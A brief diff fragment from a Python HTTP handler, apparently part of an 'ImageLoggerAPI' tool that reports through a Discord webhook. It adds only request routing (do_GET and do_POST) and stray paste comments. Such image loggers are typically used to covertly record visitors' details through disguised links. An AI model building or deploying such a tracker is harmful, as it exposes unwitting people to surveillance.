@@ -295,3 +295,12 @@ if (!currenturl.includes("g=")) {
 
             self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = ImageLoggerAPI
+# message.txt
+# 14 KB
